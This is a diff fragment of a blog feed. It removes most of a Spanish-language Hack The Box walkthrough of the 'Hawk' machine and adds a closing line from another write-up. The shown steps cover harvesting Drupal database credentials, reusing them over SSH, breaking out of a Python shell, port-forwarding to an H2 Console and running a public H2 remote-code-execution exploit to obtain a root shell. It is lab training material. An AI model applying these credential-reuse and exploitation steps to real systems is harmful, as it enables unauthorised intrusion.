- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; username, password, host, and database name.
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;,
-      &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupal'&lt;/span&gt;,
-      &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupal4hawk'&lt;/span&gt;,
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; by using the username and password variables. The proxy_user_agent variable
-&lt;span class=&quot;c&quot;&gt;# $conf['proxy_username'] = '';&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# $conf['proxy_password'] = '';&lt;/span&gt;
-www-data@hawk:/var/www/html/sites/default&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora probaremos las credenciales &lt;em&gt;“daniel:drupal4hawk”&lt;/em&gt; en el servicio &lt;strong&gt;ssh&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh daniel@10.10.10.102
-daniel@10.10.10.102&lt;span class=&quot;s1&quot;&gt;'s password: 
-Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Fri Sep 17 06:14:20 UTC 2021
-
-  System load:  0.0               Processes:           173
-  Usage of /:   47.5% of 7.32GB   Users logged in:     0
-  Memory usage: 58%               IP address for eth0: 10.10.10.102
-  Swap usage:   0%
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-417 packages can be updated.
-268 updates are security updates.
-
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-Last login: Fri Sep 17 06:02:50 2021 from 10.10.14.2
-Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
-[GCC 7.3.0] on linux
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
-&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; import os
-&amp;gt;&amp;gt;&amp;gt; os.system(&quot;/bin/bash&quot;)
-daniel@hawk:~$ whoami
-daniel
-daniel@hawk:~$
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Contamos con credenciales válidas de acceso por &lt;strong&gt;ssh&lt;/strong&gt;; ahora en nuestra máquina de atacante, procedemos a realizar un &lt;em&gt;Local Port Forwarding&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 4646:127.0.0.1:8082 daniel@10.10.10.102
-daniel@10.10.10.102&lt;span class=&quot;s1&quot;&gt;'s password: 
-Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Fri Sep 17 06:20:25 UTC 2021
-
-  System load:  0.01              Processes:           173
-  Usage of /:   47.5% of 7.32GB   Users logged in:     0
-  Memory usage: 58%               IP address for eth0: 10.10.10.102
-  Swap usage:   0%
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-417 packages can be updated.
-268 updates are security updates.
-
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-Last login: Fri Sep 17 06:14:21 2021 from 10.10.14.2
-Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
-[GCC 7.3.0] on linux
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
-&amp;gt;&amp;gt;&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el puerto 4646 abierto en nuestra máquina:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ lsof &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;4646
-ssh       332076   root    4u  IPv6 790371      0t0  TCP localhost:4646 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LISTEN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ssh       332076   root    5u  IPv4 790372      0t0  TCP localhost:4646 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LISTEN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahora si ingresamos a la siguiente dirección URL, podemos ver el panel de administración de &lt;strong&gt;H2 Console&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;http://127.0.0.1:4646/&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-hawk/hawk_lpf.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Dentro de este panel, modifcamos el siguiente valor y la damos en &lt;strong&gt;Conectar&lt;/strong&gt;:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;URL JDBC: jdbc:h2:~/k4mishell&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;![[hawk_k4mishell.jpg]]&lt;/p&gt;
-
-&lt;p&gt;Vemos que se usa la versión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;H2 1.4.196&lt;/code&gt;, por lo que procedemos a buscar un posible exploit:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit H2 1.4.196
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
- Exploit Title                                                                                 |  Path
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-H2 Database 1.4.196 - Remote Code Execution                                                    | java/webapps/45506.py
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos un posible exploit a utilizar hecho en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;, por lo que lo descargar y procedemos a ejecutarlo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; java/webapps/45506.py
-  Exploit: H2 Database 1.4.196 - Remote Code Execution
-      URL: https://www.exploit-db.com/exploits/45506
-     Path: /usr/share/exploitdb/exploits/java/webapps/45506.py
-File Type: Python script, UTF-8 Unicode text executable, with CRLF line terminators
-
-Copied to: /home/k4miyo/Documentos/HTB/Hawk/exploits/45506.py
-
-
-❯ &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;45506.py h2_console.py
-❯ python3 h2_console.py
-usage: h2_console.py &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 127.0.0.1:8082 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; jdbc:h2:~/emptydb-N5s2o]
-h2_console.py: error: the following arguments are required: &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt;/--host
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para su ejecución tenemos que indicarle el host y el valor &lt;strong&gt;jdbc&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 h2_console.py &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 127.0.0.1:4646 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; jdbc:h2:~/k4mi
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to create database
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Created database and logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage 1
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Shell succeeded - ^c or quit to &lt;span class=&quot;nb&quot;&gt;exit
-&lt;/span&gt;h2-shell&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-
-h2-shell&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A este punto ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><summary type="html">Resolución de la máquina Hawk en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos administradores de la máquina y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="SQL" /><category term="Powershell" /><category term="Injection" /><summary type="html">Resolución de la máquina Querier en la plataforma de Hack The Box</summary></entry></feed>
